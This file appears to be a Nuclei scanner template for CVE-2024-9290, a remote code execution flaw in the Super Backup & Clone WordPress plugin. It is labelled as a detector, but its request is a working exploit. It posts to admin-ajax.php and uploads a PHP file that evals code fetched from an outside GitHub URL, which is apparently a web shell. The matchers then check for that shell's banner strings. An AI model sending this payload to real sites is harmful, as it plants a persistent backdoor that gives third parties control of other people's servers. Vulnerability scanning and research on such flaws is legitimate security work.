id: CVE-2024-9290

info:
  name: Super Backup & Clone - Remote Code Execution
  author: Betmen-N-Dgeng
  severity: critical
  description: |
    Detects CVE-2024-9290, a remote code execution vulnerability in the Super Backup & Clone plugin for WordPress.
  reference:
    - https://example.com/CVE-2024-9290
  tags: cve, cve2024, wordpress, rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate, br"
      Content-Type: "multipart/form-data; boundary=---------------------------12986918151631900204175958232"
      Upgrade-Insecure-Requests: "1"
      Sec-Fetch-Dest: "document"
      Sec-Fetch-Mode: "navigate"
      Sec-Fetch-Site: "same-origin"
      Sec-Fetch-User: "?1"
      Priority: "u=0, i"
      Te: "trailers"

    body: |
      -----------------------------12986918151631900204175958232\r\n
      Content-Disposition: form-data; name="ibk_restore_migrate_action"\r\n\r\n
      1\r\n
      -----------------------------12986918151631900204175958232\r\n
      Content-Disposition: form-data; name="restore_type"\r\n\r\n
      restore_file\r\n
      -----------------------------12986918151631900204175958232\r\n
      Content-Disposition: form-data; name="restore_url"\r\n\r\n
      \r\n
      -----------------------------12986918151631900204175958232\r\n
      Content-Disposition: form-data; name="upload_file"; filename=shin_code.php\r\n
      Content-Type: application/zip\r\n\r\n
      <?php @eval("?>".file_get_contents("https://raw.githubusercontent.com/Jenderal92/KC5/master/shin.php"));?>\r\n
      -----------------------------12986918151631900204175958232--\r\n

    matchers:
      - type: word
        part: body
        words:
          - "Shin Bypassed"
          - "Coded By Shin Code"
        condition: or
